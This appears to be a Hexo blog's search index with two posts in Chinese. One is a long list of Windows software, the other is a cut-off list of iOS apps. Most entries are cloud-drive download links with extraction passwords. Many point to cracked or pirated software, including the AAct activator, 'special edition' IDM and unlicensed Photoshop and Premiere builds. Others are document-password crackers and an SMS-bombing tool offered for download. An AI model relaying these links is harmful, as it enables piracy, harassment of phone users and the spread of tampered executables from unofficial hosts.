<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Windows必备软件</title>
    <url>/posts/3af35f4b/</url>
    <content><![CDATA[<h1 id="Windows-和-Office-激活-AAct-x64"><a href="#Windows-和-Office-激活-AAct-x64" class="headerlink" title="Windows 和 Office 激活 AAct_x64"></a>Windows 和 Office 激活 AAct_x64</h1><p><a href="https://wwm.lanzouw.com/i6fvi0dr7m1g">https://wwm.lanzouw.com/i6fvi0dr7m1g</a> 密码:awc9</p>
<h1 id="办公："><a href="#办公：" class="headerlink" title="办公："></a>办公：</h1><h2 id="WPS-2016-单文件极简版"><a href="#WPS-2016-单文件极简版" class="headerlink" title="WPS 2016 单文件极简版"></a>WPS 2016 单文件极简版</h2><p><a href="https://wwsf.lanzouw.com/imZaI0uyptkj">https://wwsf.lanzouw.com/imZaI0uyptkj</a></p>
<p>密码:hg7d</p>
<h2 id="WPS-2019-免激活专业增强版10154"><a href="#WPS-2019-免激活专业增强版10154" class="headerlink" title="WPS 2019 免激活专业增强版10154"></a>WPS 2019 免激活专业增强版10154</h2><p>链接: <a href="https://pan.baidu.com/s/1Gc4XJH_r3LoWMCfPDLCa4A?pwd=fhrd">https://pan.baidu.com/s/1Gc4XJH_r3LoWMCfPDLCa4A?pwd=fhrd</a> 提取码: fhrd 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h2 id="WPS-2023-政府版"><a href="#WPS-2023-政府版" class="headerlink" title="WPS 2023 政府版"></a>WPS 2023 政府版</h2><p>链接：<a href="https://pan.quark.cn/s/b5a792595137">https://pan.quark.cn/s/b5a792595137</a> 提取码：vABV</p>
<h1 id="播放器：PotPlayer-1-7-21620"><a href="#播放器：PotPlayer-1-7-21620" class="headerlink" title="播放器：PotPlayer_1.7.21620"></a>播放器：PotPlayer_1.7.21620</h1><p><a href="https://wwm.lanzouw.com/ihNhp09dqopi">https://wwm.lanzouw.com/ihNhp09dqopi</a> 密码:29td</p>
<h1 id="输入法：搜狗拼音"><a href="#输入法：搜狗拼音" class="headerlink" title="输入法：搜狗拼音"></a>输入法：搜狗拼音</h1><p><a href="https://wwm.lanzouw.com/iev4I09dqpji">https://wwm.lanzouw.com/iev4I09dqpji</a> 密码:9rf0</p>
<h1 id="浏览器："><a href="#浏览器：" class="headerlink" title="浏览器："></a>浏览器：</h1><p>Chrome </p>
<p><a href="https://wwm.lanzouw.com/i7P4X09dssba">https://wwm.lanzouw.com/i7P4X09dssba</a> 密码:c7i1</p>
<p>360安全浏览器13.1.6002.0免安装解压版</p>
<p>下载:<a href="https://wwsf.lanzn.com/ifSkR2cg9ksd">https://wwsf.lanzn.com/ifSkR2cg9ksd</a> 密码:cjmn</p>
<p>360SE-15.3.5102.64-Stable-Modified-Lite.exe<br>链接：<a href="https://pan.quark.cn/s/a3d027484ea4">https://pan.quark.cn/s/a3d027484ea4</a><br>提取码：Tbp8</p>
<h1 id="杀毒软件：火绒"><a href="#杀毒软件：火绒" class="headerlink" title="杀毒软件：火绒"></a>杀毒软件：火绒</h1><p><a href="https://www.huorong.cn/person5.html">https://www.huorong.cn/person5.html</a></p>
<h1 id="剪贴板增强工具：ditto"><a href="#剪贴板增强工具：ditto" class="headerlink" title="剪贴板增强工具：ditto"></a>剪贴板增强工具：ditto</h1><p><a href="https://wwm.lanzouw.com/iI19q09dsxmb">https://wwm.lanzouw.com/iI19q09dsxmb</a> 密码:30py</p>
<h1 id="卸载软件：geek"><a href="#卸载软件：geek" class="headerlink" title="卸载软件：geek"></a>卸载软件：geek</h1><p><a href="https://geekuninstaller.com/">https://geekuninstaller.com/</a></p>
<h1 id="压缩软件："><a href="#压缩软件：" class="headerlink" title="压缩软件："></a>压缩软件：</h1><h2 id="WinRAR-官网"><a href="#WinRAR-官网" class="headerlink" title="WinRAR 官网"></a>WinRAR <a href="https://www.rarlab.com/download.htm">官网</a></h2><p>简体中文注册版</p>
<p>6.11 <a href="https://wwm.lanzouw.com/id3EI09dqpyd">https://wwm.lanzouw.com/id3EI09dqpyd</a> 密码:e9uv</p>
<p>6.23 <a href="https://wwsf.lanzouw.com/iUdkZ16am7fc">https://wwsf.lanzouw.com/iUdkZ16am7fc</a> 密码:9444</p>
<h2 id="7-zip-官网"><a href="#7-zip-官网" class="headerlink" title="7-zip 官网"></a>7-zip <a href="https://www.7-zip.org/download.html">官网</a></h2><h1 id="百度文库提取下载PDF"><a href="#百度文库提取下载PDF" class="headerlink" title="百度文库提取下载PDF"></a>百度文库提取下载PDF</h1><p><a href="https://wwm.lanzouw.com/imhay09dp90h">https://wwm.lanzouw.com/imhay09dp90h</a> 密码:90zz</p>
<h1 id="下载软件："><a href="#下载软件：" class="headerlink" title="下载软件："></a>下载软件：</h1><h2 id="（1）迅雷不限速"><a href="#（1）迅雷不限速" class="headerlink" title="（1）迅雷不限速"></a>（1）迅雷不限速</h2><p><a href="https://wwm.lanzouw.com/iN71809dl5ti">https://wwm.lanzouw.com/iN71809dl5ti</a> 密码:dpuw</p>
<h2 id="（2）-Aria2"><a href="#（2）-Aria2" class="headerlink" title="（2） Aria2"></a>（2） Aria2</h2><p><a href="https://wwsf.lanzouw.com/iFJzp0u84bkj">https://wwsf.lanzouw.com/iFJzp0u84bkj</a> 密码:1mzv </p>
<p>配合油猴插件百度网盘 <a href="https://greasyfork.org/zh-CN/scripts/463171-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E5%8D%83%E5%8D%83%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B">https://greasyfork.org/zh-CN/scripts/463171-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E5%8D%83%E5%8D%83%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B</a></p>
<h2 id="（3）IDM-v6-38-7-2-中文绿色特别版"><a href="#（3）IDM-v6-38-7-2-中文绿色特别版" class="headerlink" title="（3）IDM v6.38.7.2 中文绿色特别版"></a>（3）IDM v6.38.7.2 中文绿色特别版</h2><p><a href="https://wwm.lanzouw.com/iw8ak09fb9af">https://wwm.lanzouw.com/iw8ak09fb9af</a> 密码:65nc </p>
<p>手动配置：选项-下载-UA填netdisk;3.0.0.112 连接类型选较高速率连接，默认最大连接数4</p>
<h2 id="（4）文件蜈蚣"><a href="#（4）文件蜈蚣" class="headerlink" title="（4）文件蜈蚣"></a>（4）文件蜈蚣</h2><p><a href="https://wwm.lanzouw.com/iefD90blolgj">https://wwm.lanzouw.com/iefD90blolgj</a> 密码:ccpe</p>
<h2 id="（5）Hitomi-downloader"><a href="#（5）Hitomi-downloader" class="headerlink" title="（5）Hitomi_downloader"></a>（5）Hitomi_downloader</h2><p><a href="https://wwm.lanzouw.com/iSoEF0blotfg">https://wwm.lanzouw.com/iSoEF0blotfg</a> 密码:88u7</p>
<h2 id="（6）uTorrent（磁力和bt都可以下载）"><a href="#（6）uTorrent（磁力和bt都可以下载）" class="headerlink" title="（6）uTorrent（磁力和bt都可以下载）"></a>（6）uTorrent（磁力和bt都可以下载）</h2><p><a href="https://wwm.lanzouw.com/iivGF0dr4x7a">https://wwm.lanzouw.com/iivGF0dr4x7a</a> 密码:6uxu</p>
<h2 id="（7）迅雷11-v11-1-11-1618-去广告本地SVIP绿色精简版"><a href="#（7）迅雷11-v11-1-11-1618-去广告本地SVIP绿色精简版" class="headerlink" title="（7）迅雷11_v11.1.11.1618_去广告本地SVIP绿色精简版"></a>（7）迅雷11_v11.1.11.1618_去广告本地SVIP绿色精简版</h2><p><a href="https://wwm.lanzouw.com/ixtdh0dr3pji">https://wwm.lanzouw.com/ixtdh0dr3pji</a> 密码:br1b</p>
<h2 id="（8）BitComet-Stable-v1-94-9-11"><a href="#（8）BitComet-Stable-v1-94-9-11" class="headerlink" title="（8）BitComet Stable v1.94.9.11"></a>（8）BitComet Stable v1.94.9.11</h2><p><a href="https://wwm.lanzouw.com/ie61C0dr5xti">https://wwm.lanzouw.com/ie61C0dr5xti</a> 密码:3j5c</p>
<h2 id="（9）迅雷5-8绿色去广告支持磁力"><a href="#（9）迅雷5-8绿色去广告支持磁力" class="headerlink" title="（9）迅雷5.8绿色去广告支持磁力"></a>（9）迅雷5.8绿色去广告支持磁力</h2><p><a href="https://wwm.lanzouw.com/i6AG50dypx6h">https://wwm.lanzouw.com/i6AG50dypx6h</a> 密码:goq3</p>
<h1 id="残芯专用TWRPRecovery入工具"><a href="#残芯专用TWRPRecovery入工具" class="headerlink" title="残芯专用TWRPRecovery入工具"></a>残芯专用TWRPRecovery入工具</h1><p><a href="https://wwm.lanzouw.com/iN71809dl5ti">https://wwm.lanzouw.com/iN71809dl5ti</a> 密码:dpuw</p>
<h1 id="金蝶KIS-V12-0"><a href="#金蝶KIS-V12-0" class="headerlink" title="金蝶KIS V12.0"></a>金蝶KIS V12.0</h1><h1 id="图片压缩：JPGC-v4-0-21-902"><a href="#图片压缩：JPGC-v4-0-21-902" class="headerlink" title="图片压缩：JPGC_v4.0.21.902"></a>图片压缩：JPGC_v4.0.21.902</h1><p><a href="https://wwm.lanzouw.com/iLuLL09dpuad">https://wwm.lanzouw.com/iLuLL09dpuad</a> 密码:hkge</p>
<h1 id="绕过文档密码编辑和打印：UnProtector"><a href="#绕过文档密码编辑和打印：UnProtector" class="headerlink" title="绕过文档密码编辑和打印：UnProtector"></a>绕过文档密码编辑和打印：UnProtector</h1><p><a href="https://wwm.lanzouw.com/iWYsS09dq34b">https://wwm.lanzouw.com/iWYsS09dq34b</a> 密码:esq4</p>
<h1 id="定时同步备份到网盘："><a href="#定时同步备份到网盘：" class="headerlink" title="定时同步备份到网盘："></a>定时同步备份到网盘：</h1><h2 id="filegee10-0-9（有数据丢失风险）"><a href="#filegee10-0-9（有数据丢失风险）" class="headerlink" title="filegee10.0.9（有数据丢失风险）"></a>filegee10.0.9（有数据丢失风险）</h2><p><a href="https://wwm.lanzouw.com/iqSu809dqqje">https://wwm.lanzouw.com/iqSu809dqqje</a> 密码:3rpx</p>
<h2 id="坚果云"><a href="#坚果云" class="headerlink" title="坚果云"></a>坚果云</h2><p><a href="https://www.jianguoyun.com/s/pricing">https://www.jianguoyun.com/s/pricing</a></p>
<h1 id="分区工具：DiskGenius-Pro-v5-4-3-1342"><a href="#分区工具：DiskGenius-Pro-v5-4-3-1342" class="headerlink" title="分区工具：DiskGenius_Pro_v5.4.3.1342"></a>分区工具：DiskGenius_Pro_v5.4.3.1342</h1><p><a href="https://wwm.lanzouw.com/idGtB0dejcqf">https://wwm.lanzouw.com/idGtB0dejcqf</a> 密码:cgzz</p>
<h1 id="激活Windows：AAct-x64"><a href="#激活Windows：AAct-x64" class="headerlink" title="激活Windows：AAct_x64"></a>激活Windows：AAct_x64</h1><p><a href="https://wwm.lanzouw.com/isrS409dslyb">https://wwm.lanzouw.com/isrS409dslyb</a> 密码:crw9</p>
<h1 id="Photoshop-2021"><a href="#Photoshop-2021" class="headerlink" title="Photoshop 2021"></a>Photoshop 2021</h1><p>链接: <a href="https://pan.baidu.com/s/1xRdwsLIbOKuewZymriSa5Q?pwd=p9sr">https://pan.baidu.com/s/1xRdwsLIbOKuewZymriSa5Q?pwd=p9sr</a> 提取码: p9sr 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="Photoshop-2022"><a href="#Photoshop-2022" class="headerlink" title="Photoshop 2022"></a>Photoshop 2022</h1><p>链接: <a href="https://pan.baidu.com/s/1FURILq16WgbC1DG_TEIR4Q?pwd=nfih">https://pan.baidu.com/s/1FURILq16WgbC1DG_TEIR4Q?pwd=nfih</a> 提取码: nfih 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="PS2021-PS2022神经网络滤镜离线完整组件包2022年6月版"><a href="#PS2021-PS2022神经网络滤镜离线完整组件包2022年6月版" class="headerlink" title="PS2021-PS2022神经网络滤镜离线完整组件包2022年6月版"></a>PS2021-PS2022神经网络滤镜离线完整组件包2022年6月版</h1><p>链接: <a href="https://pan.baidu.com/s/1UOO5CzNjfd-O7Qeo-BvT9g?pwd=s8jn">https://pan.baidu.com/s/1UOO5CzNjfd-O7Qeo-BvT9g?pwd=s8jn</a> 提取码: s8jn 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="Photoshop-2023"><a href="#Photoshop-2023" class="headerlink" title="Photoshop 2023"></a>Photoshop 2023</h1><p>链接: <a href="https://pan.baidu.com/s/12YHiUR0WG3k5kwH6BxmGwA?pwd=q372">https://pan.baidu.com/s/12YHiUR0WG3k5kwH6BxmGwA?pwd=q372</a> 提取码: q372 复制这段内容后打开百度网盘手机App，操作更方便哦 解压缩密码：@vposy</p>
<h1 id="PS-2023-Neural-Filterss-神经网络滤镜"><a href="#PS-2023-Neural-Filterss-神经网络滤镜" class="headerlink" title="PS 2023-Neural Filterss 神经网络滤镜"></a>PS 2023-Neural Filterss 神经网络滤镜</h1><p>链接: <a href="https://pan.baidu.com/s/1reRP6JP0s3sh3-kd973rxQ?pwd=pksb">https://pan.baidu.com/s/1reRP6JP0s3sh3-kd973rxQ?pwd=pksb</a> 提取码: pksb 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="Photoshop-2024-25-12-0-806"><a href="#Photoshop-2024-25-12-0-806" class="headerlink" title="Photoshop 2024-25.12.0.806"></a>Photoshop 2024-25.12.0.806</h1><p><a href="https://www.123pan.com/s/zuYeVv-t3bbd?%E6%8F%90%E5%8F%96%E7%A0%81:YTTd">https://www.123pan.com/s/zuYeVv-t3bbd?提取码:YTTd</a></p>
<h1 id="Photoshop-CS6图编辑-v13-0"><a href="#Photoshop-CS6图编辑-v13-0" class="headerlink" title="Photoshop CS6图编辑 v13.0"></a>Photoshop CS6图编辑 v13.0</h1><p><a href="https://wwsf.lanzouw.com/iyjq30uyptcb">https://wwsf.lanzouw.com/iyjq30uyptcb</a> 密码:1ewu</p>
<h1 id="Luminar-Neo-1-4-0-10345"><a href="#Luminar-Neo-1-4-0-10345" class="headerlink" title="Luminar Neo 1.4.0 (10345)"></a>Luminar Neo 1.4.0 (10345)</h1><p>链接: <a href="https://pan.baidu.com/s/1ExGED8CqgEge_Ct-8yclvw?pwd=pfkr">https://pan.baidu.com/s/1ExGED8CqgEge_Ct-8yclvw?pwd=pfkr</a> 提取码: pfkr 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="Premiere-Pro-2022"><a href="#Premiere-Pro-2022" class="headerlink" title="Premiere Pro 2022"></a>Premiere Pro 2022</h1><p>链接: <a href="https://pan.baidu.com/s/1eN5F4lfsOVZLTQ911pANbQ?pwd=3q3m">https://pan.baidu.com/s/1eN5F4lfsOVZLTQ911pANbQ?pwd=3q3m</a> 提取码: 3q3m 复制这段内容后打开百度网盘手机App，操作更方便哦 解压缩密码：@vposy</p>
<h1 id="Premiere-Pro-2023"><a href="#Premiere-Pro-2023" class="headerlink" title="Premiere Pro 2023"></a>Premiere Pro 2023</h1><p>链接: <a href="https://pan.baidu.com/s/1YHhpSyxpbNUUnqJ5rO0AAg?pwd=ny9n">https://pan.baidu.com/s/1YHhpSyxpbNUUnqJ5rO0AAg?pwd=ny9n</a> 提取码: ny9n 复制这段内容后打开百度网盘手机App，操作更方便哦 解压缩密码：@vposy</p>
<h1 id="虚拟机：VMWARE16"><a href="#虚拟机：VMWARE16" class="headerlink" title="虚拟机：VMWARE16"></a>虚拟机：VMWARE16</h1><p>链接: <a href="https://pan.baidu.com/s/1ujg0U_xsLCv34UcaX8Y2Mw?pwd=b853">https://pan.baidu.com/s/1ujg0U_xsLCv34UcaX8Y2Mw?pwd=b853</a> 提取码: b853 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="录屏：ScreenRec-app"><a href="#录屏：ScreenRec-app" class="headerlink" title="录屏：ScreenRec_app"></a>录屏：ScreenRec_app</h1><p><a href="https://wwm.lanzouw.com/ioa3z09dvryf">https://wwm.lanzouw.com/ioa3z09dvryf</a> 密码:204o</p>
<h1 id="CR-TubeGet"><a href="#CR-TubeGet" class="headerlink" title="CR TubeGet"></a>CR TubeGet</h1><p><a href="https://www.cr-soft.net/crtubeget.html">CR TubeGet - CR-部落 (cr-soft.net)</a></p>
<h1 id="格式工厂："><a href="#格式工厂：" class="headerlink" title="格式工厂："></a>格式工厂：</h1><p>链接: <a href="https://pan.baidu.com/s/1CL-7DLlbB1c2B4-NvJckdQ?pwd=gde3">https://pan.baidu.com/s/1CL-7DLlbB1c2B4-NvJckdQ?pwd=gde3</a> 提取码: gde3 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="驱动："><a href="#驱动：" class="headerlink" title="驱动："></a>驱动：</h1><h2 id="驱动精灵不限速"><a href="#驱动精灵不限速" class="headerlink" title="驱动精灵不限速"></a>驱动精灵不限速</h2><p><a href="https://wwm.lanzouw.com/iFAdO09faioh">https://wwm.lanzouw.com/iFAdO09faioh</a> 密码:hvxp</p>
<h2 id="驱动精灵标准版-v9-70-0-104-纯净版"><a href="#驱动精灵标准版-v9-70-0-104-纯净版" class="headerlink" title="驱动精灵标准版_v9.70.0.104_纯净版"></a>驱动精灵标准版_v9.70.0.104_纯净版</h2><p><a href="https://wwm.lanzouw.com/iht5A0clsaqd">https://wwm.lanzouw.com/iht5A0clsaqd</a> 密码:65qd</p>
<h2 id="驱动人生不限速"><a href="#驱动人生不限速" class="headerlink" title="驱动人生不限速"></a>驱动人生不限速</h2><p><a href="https://wwm.lanzouw.com/ibYyq09f97sj">https://wwm.lanzouw.com/ibYyq09f97sj</a> 密码:1hiv</p>
<h1 id="复制粘贴增强版-FastCopy"><a href="#复制粘贴增强版-FastCopy" class="headerlink" title="复制粘贴增强版 FastCopy"></a>复制粘贴增强版 FastCopy</h1><p><a href="https://wwm.lanzouw.com/iZVzP09f99ha">https://wwm.lanzouw.com/iZVzP09f99ha</a> 密码:au3d</p>
<h1 id="金山PDF西工大定制专业版内置激活-11-8-0-8845"><a href="#金山PDF西工大定制专业版内置激活-11-8-0-8845" class="headerlink" title="金山PDF西工大定制专业版内置激活 11.8.0.8845"></a>金山PDF西工大定制专业版内置激活 11.8.0.8845</h1><p>链接: <a href="https://pan.baidu.com/s/1RVllibQtmmxulJ6Fft6jMA?pwd=ejp6">https://pan.baidu.com/s/1RVllibQtmmxulJ6Fft6jMA?pwd=ejp6</a> 提取码: ejp6 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="PDF编辑器：adobe-acrobat-X-pro"><a href="#PDF编辑器：adobe-acrobat-X-pro" class="headerlink" title="PDF编辑器：adobe acrobat X pro"></a>PDF编辑器：adobe acrobat X pro</h1><p>链接: <a href="https://pan.baidu.com/s/1HQOGoqA00IFPXvz10imvgA?pwd=xqyz">https://pan.baidu.com/s/1HQOGoqA00IFPXvz10imvgA?pwd=xqyz</a> 提取码: xqyz 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="万兴PDF"><a href="#万兴PDF" class="headerlink" title="万兴PDF"></a>万兴PDF</h1><p>链接: <a href="https://pan.baidu.com/s/19fzTxxGGqLbm4vhOlmNrkw?pwd=3jkc">https://pan.baidu.com/s/19fzTxxGGqLbm4vhOlmNrkw?pwd=3jkc</a> 提取码: 3jkc 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="小巧PDF阅读器"><a href="#小巧PDF阅读器" class="headerlink" title="小巧PDF阅读器"></a>小巧PDF阅读器</h1><p><a href="https://www.sumatrapdfreader.org/download-free-pdf-viewer">https://www.sumatrapdfreader.org/download-free-pdf-viewer</a></p>
<h1 id="RAR密码"><a href="#RAR密码" class="headerlink" title="RAR密码"></a>RAR密码</h1><p><a href="https://wwm.lanzouw.com/i3M5z09jpchi">https://wwm.lanzouw.com/i3M5z09jpchi</a> 密码:5tfv</p>
<h1 id="FolderMove（将程序或游戏的安装文件夹移动到其他驱动器，无需破坏或重新安装。将创建一个从旧目录到新目录的符号链接）"><a href="#FolderMove（将程序或游戏的安装文件夹移动到其他驱动器，无需破坏或重新安装。将创建一个从旧目录到新目录的符号链接）" class="headerlink" title="FolderMove（将程序或游戏的安装文件夹移动到其他驱动器，无需破坏或重新安装。将创建一个从旧目录到新目录的符号链接）"></a>FolderMove（将程序或游戏的安装文件夹移动到其他驱动器，无需破坏或重新安装。将创建一个从旧目录到新目录的符号链接）</h1><p> <a href="https://wwm.lanzouw.com/i8heW09lr12b">https://wwm.lanzouw.com/i8heW09lr12b</a> 密码:4qi7</p>
<h1 id="文件转换器-File-Converter"><a href="#文件转换器-File-Converter" class="headerlink" title="文件转换器 File Converter"></a>文件转换器 File Converter</h1><p><a href="https://wwm.lanzouw.com/iZPTn09lr23i">https://wwm.lanzouw.com/iZPTn09lr23i</a> 密码:c6dc</p>
<h1 id="视频压缩和转码：HandBrake"><a href="#视频压缩和转码：HandBrake" class="headerlink" title="视频压缩和转码：HandBrake"></a>视频压缩和转码：HandBrake</h1><p><a href="https://handbrake.fr/">https://handbrake.fr/</a></p>
<h1 id="增強版任務管理器：processhacker"><a href="#增強版任務管理器：processhacker" class="headerlink" title="增強版任務管理器：processhacker"></a>增強版任務管理器：processhacker</h1><p><a href="https://processhacker.sourceforge.io/">https://processhacker.sourceforge.io/</a></p>
<h1 id="我的ABC软件工具箱"><a href="#我的ABC软件工具箱" class="headerlink" title="我的ABC软件工具箱"></a>我的ABC软件工具箱</h1><p>链接: <a href="https://pan.baidu.com/s/16HfcDzMRzc2gE82_P6r2lA?pwd=8jnr">https://pan.baidu.com/s/16HfcDzMRzc2gE82_P6r2lA?pwd=8jnr</a> 提取码: 8jnr 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="火绒文件粉碎机-v5-0-0-1"><a href="#火绒文件粉碎机-v5-0-0-1" class="headerlink" title="火绒文件粉碎机_v5.0.0.1"></a>火绒文件粉碎机_v5.0.0.1</h1><p><a href="https://wwm.lanzouw.com/itXaZ0a01q7a">https://wwm.lanzouw.com/itXaZ0a01q7a</a> 密码:5wxu</p>
<h1 id="沙盒Sandboxie"><a href="#沙盒Sandboxie" class="headerlink" title="沙盒Sandboxie"></a>沙盒Sandboxie</h1><p><a href="https://sandboxie-plus.com/downloads/">https://sandboxie-plus.com/downloads/</a></p>
<h1 id="阿里云盘最后无会员版-aDrive-v2-4-0-127"><a href="#阿里云盘最后无会员版-aDrive-v2-4-0-127" class="headerlink" title="阿里云盘最后无会员版 aDrive_v2.4.0.127"></a>阿里云盘最后无会员版 aDrive_v2.4.0.127</h1><p><a href="https://wwm.lanzouw.com/imDJb0b9qhsh">https://wwm.lanzouw.com/imDJb0b9qhsh</a> 密码:eosf</p>
<h1 id="视频去水印及裁剪-Easy-Video-Logo-Remover-1-4-1-汉化版"><a href="#视频去水印及裁剪-Easy-Video-Logo-Remover-1-4-1-汉化版" class="headerlink" title="视频去水印及裁剪 Easy Video Logo Remover 1.4.1 汉化版"></a>视频去水印及裁剪 Easy Video Logo Remover 1.4.1 汉化版</h1><p><a href="https://wwm.lanzouw.com/inwwD0brt54h">https://wwm.lanzouw.com/inwwD0brt54h</a> 密码:cv5h</p>
<h1 id="图片去水印-Inpaint-v9-1-x64"><a href="#图片去水印-Inpaint-v9-1-x64" class="headerlink" title="图片去水印 Inpaint_v9.1_x64"></a>图片去水印 Inpaint_v9.1_x64</h1><p><a href="https://wwm.lanzouw.com/iksI10brt5zi">https://wwm.lanzouw.com/iksI10brt5zi</a> 密码:4jvd</p>
<h1 id="硬盘分区占用分析-SpaceSniffer"><a href="#硬盘分区占用分析-SpaceSniffer" class="headerlink" title="硬盘分区占用分析 SpaceSniffer"></a>硬盘分区占用分析 SpaceSniffer</h1><p><a href="https://wwm.lanzouw.com/iACKp0by97yb">https://wwm.lanzouw.com/iACKp0by97yb</a> 密码:fywc</p>
<h1 id="视频解析"><a href="#视频解析" class="headerlink" title="视频解析"></a>视频解析</h1><p><a href="https://wwm.lanzouw.com/iWXFD0byd4pi">https://wwm.lanzouw.com/iWXFD0byd4pi</a> 密码:d4u2</p>
<h1 id="注册表工具-RegistryFinder-V2-54"><a href="#注册表工具-RegistryFinder-V2-54" class="headerlink" title="注册表工具 RegistryFinder_V2.54"></a>注册表工具 RegistryFinder_V2.54</h1><p><a href="https://wwm.lanzouw.com/iJDIM0byvaob">https://wwm.lanzouw.com/iJDIM0byvaob</a> 密码:7c8i</p>
<h1 id="视频压缩工具-handbrake"><a href="#视频压缩工具-handbrake" class="headerlink" title="视频压缩工具 handbrake"></a>视频压缩工具 handbrake</h1><p><a href="https://handbrake.fr/">https://handbrake.fr/</a></p>
<h1 id="入梦音频变声器"><a href="#入梦音频变声器" class="headerlink" title="入梦音频变声器"></a>入梦音频变声器</h1><p><a href="https://wwm.lanzouw.com/iyMdR0ckynkf">https://wwm.lanzouw.com/iyMdR0ckynkf</a> 密码:epbc 入梦音频变声器vip账号 账号：123456 密码：123456</p>
<h1 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a>数据恢复</h1><h2 id="R-Studio-Network-v9-0-190"><a href="#R-Studio-Network-v9-0-190" class="headerlink" title="R-Studio_Network_v9.0.190"></a>R-Studio_Network_v9.0.190</h2><p><a href="https://wwm.lanzouw.com/iqRqn0dejnaf">https://wwm.lanzouw.com/iqRqn0dejnaf</a> 密码:2b7c</p>
<h1 id="解开加密文档"><a href="#解开加密文档" class="headerlink" title="解开加密文档"></a>解开加密文档</h1><h2 id="PassFab-for-office-zip"><a href="#PassFab-for-office-zip" class="headerlink" title="PassFab for office.zip"></a>PassFab for office.zip</h2><p><a href="https://wwm.lanzouw.com/iXEWK0e19v5g">https://wwm.lanzouw.com/iXEWK0e19v5g</a> 密码:53hi</p>
<h2 id="PassFab-for-PDF-zip"><a href="#PassFab-for-PDF-zip" class="headerlink" title="PassFab for PDF.zip"></a>PassFab for PDF.zip</h2><p><a href="https://wwm.lanzouw.com/ij6Or0e19vwd">https://wwm.lanzouw.com/ij6Or0e19vwd</a> 密码:dbex</p>
<h2 id="PassFab-For-ZIP-zip"><a href="#PassFab-For-ZIP-zip" class="headerlink" title="PassFab For ZIP.zip"></a>PassFab For ZIP.zip</h2><p><a href="https://wwm.lanzouw.com/iTNcT0e19w2j">https://wwm.lanzouw.com/iTNcT0e19w2j</a> 密码:8fty</p>
<h2 id="PassFab-for-RAR-zip"><a href="#PassFab-for-RAR-zip" class="headerlink" title="PassFab.for_RAR.zip"></a>PassFab.for_RAR.zip</h2><p><a href="https://wwm.lanzouw.com/i4bzZ0e19w7e">https://wwm.lanzouw.com/i4bzZ0e19w7e</a> 密码:4p7z</p>
<h1 id="解开文档的权限"><a href="#解开文档的权限" class="headerlink" title="解开文档的权限"></a>解开文档的权限</h1><h2 id="UnProtector-v2-5"><a href="#UnProtector-v2-5" class="headerlink" title="UnProtector_v2.5"></a>UnProtector_v2.5</h2><p><a href="https://wwm.lanzouw.com/i3xPl0e19umh">https://wwm.lanzouw.com/i3xPl0e19umh</a> 密码:9pt1</p>
<h1 id="短信轰炸-短信压力测试-–-战神v2-4"><a href="#短信轰炸-短信压力测试-–-战神v2-4" class="headerlink" title="短信轰炸 短信压力测试 – 战神v2.4"></a>短信轰炸 短信压力测试 – 战神v2.4</h1><p><a href="https://wwm.lanzouw.com/i4TzK0h4jfof">https://wwm.lanzouw.com/i4TzK0h4jfof</a> 密码:3njr</p>
<h1 id="Typora-1-3-8"><a href="#Typora-1-3-8" class="headerlink" title="Typora_1.3.8"></a>Typora_1.3.8</h1><p><a href="https://wwm.lanzn.com/icV2a25f88ji">https://wwm.lanzn.com/icV2a25f88ji</a> 密码:auqx</p>
<h1 id="剪映专业6-0-1"><a href="#剪映专业6-0-1" class="headerlink" title="剪映专业6.0.1"></a>剪映专业6.0.1</h1><p>链接：<a href="https://pan.xunlei.com/s/VO4TrnehEoyDmkY1BRPu-g_7A1">https://pan.xunlei.com/s/VO4TrnehEoyDmkY1BRPu-g_7A1</a><br>提取码：tzkr<br>复制这段内容后打开手机迅雷App，查看更方便</p>
<h1 id="Raidrive"><a href="#Raidrive" class="headerlink" title="Raidrive"></a>Raidrive</h1><p>下载:<a href="https://wwsf.lanzn.com/ileHE29ahp7g">https://wwsf.lanzn.com/ileHE29ahp7g</a> 密码:2kf5</p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>苹果 iPhone iPad iOS 必备 APP</title>
    <url>/posts/f6384cef/</url>
    <content><![CDATA[<h1 id="淘宝"><a href="#淘宝" class="headerlink" title="淘宝"></a>淘宝</h1><h2 id="淘宝官方多开-10-13-0"><a href="#淘宝官方多开-10-13-0" class="headerlink" title="淘宝官方多开_10.13.0"></a>淘宝官方多开_10.13.0</h2><p>链接: <a href="https://pan.baidu.com/s/1VYJQHIfr0JwYKP7-vwcjqw?pwd=55rm">https://pan.baidu.com/s/1VYJQHIfr0JwYKP7-vwcjqw?pwd=55rm</a> 提取码: 55rm 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="闲鱼"><a href="#闲鱼" class="headerlink" title="闲鱼"></a>闲鱼</h1><h2 id="闲鱼多开-7-9-50-iPA库iPA-PUB-iPAKU-CC-iPAKU-CN"><a href="#闲鱼多开-7-9-50-iPA库iPA-PUB-iPAKU-CC-iPAKU-CN" class="headerlink" title="闲鱼多开_7.9.50@iPA库iPA.PUB_iPAKU.CC_iPAKU.CN"></a>闲鱼多开_7.9.50@iPA库iPA.PUB_iPAKU.CC_iPAKU.CN</h2><p><a href="https://www.123pan.com/s/zuYeVv-VkKbd.html%E6%8F%90%E5%8F%96%E7%A0%81:AA0w">https://www.123pan.com/s/zuYeVv-VkKbd.html提取码:AA0w</a></p>
